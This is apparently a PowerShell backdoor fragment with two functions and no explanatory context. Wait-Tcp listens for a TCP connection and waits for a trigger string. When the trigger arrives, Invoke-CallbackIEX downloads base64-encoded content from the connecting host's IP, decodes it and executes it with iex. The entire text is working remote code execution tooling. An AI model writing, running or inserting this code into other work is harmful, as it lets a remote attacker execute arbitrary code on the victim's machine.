function Invoke-CallbackIEX {
    param([string]$CallbackIP)
    $enc = (New-Object Net.WebClient).DownloadString("http://$CallbackIP/resource")
    $b = [System.Convert]::FromBase64String($enc)
    $dec = [System.Text.Encoding]::UTF8.GetString($b)
    iex $dec
}
function Wait-Tcp {
    param($Listener, $Trigger)
    $Client = $Listener.AcceptTcpClient()
    $Reader = New-Object System.IO.StreamReader($Client.GetStream())
    $line = $Reader.ReadLine()
    if ($line -eq $Trigger) {
        $match = ([System.Net.IPEndPoint] $Client.Client.RemoteEndPoint).Address.ToString()
        Invoke-CallbackIEX $match
    }
}
